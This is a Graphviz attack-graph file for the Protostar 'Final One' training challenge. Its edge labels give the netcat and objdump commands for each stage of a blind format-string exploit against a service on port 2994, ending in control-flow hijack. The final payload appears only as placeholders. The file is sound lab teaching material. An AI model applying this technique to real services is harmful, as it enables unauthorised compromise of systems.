digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Final One"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Remote protocol understood"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Blind format-string primitive confirmed"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Writable target address chosen"];
  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Alignment for remote writes determined"];
  node4 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Blind overwrite payload built"];
  node5 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Remote control flow hijacked"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="(echo 'username test'; echo 'login test') | nc <target-hostname-or-ip> 2994"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="(echo 'username test'; echo 'login %x.%x.%x') | nc <target-hostname-or-ip> 2994"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -TR /opt/protostar/bin/final1 | egrep \"(exit|puts|printf)\""];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="(echo 'username AAAA'; echo 'login <addr>%x.%x.%x.%x.%x') | nc <target-hostname-or-ip> 2994"];
  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"username <crafted>\\nlogin <format_payload>\"' > /tmp/final1.in"];
  node4 -> node5 [color="#555555", fontname="Helvetica", fontsize="10", label="cat /tmp/final1.in | nc <target-hostname-or-ip> 2994"];
}
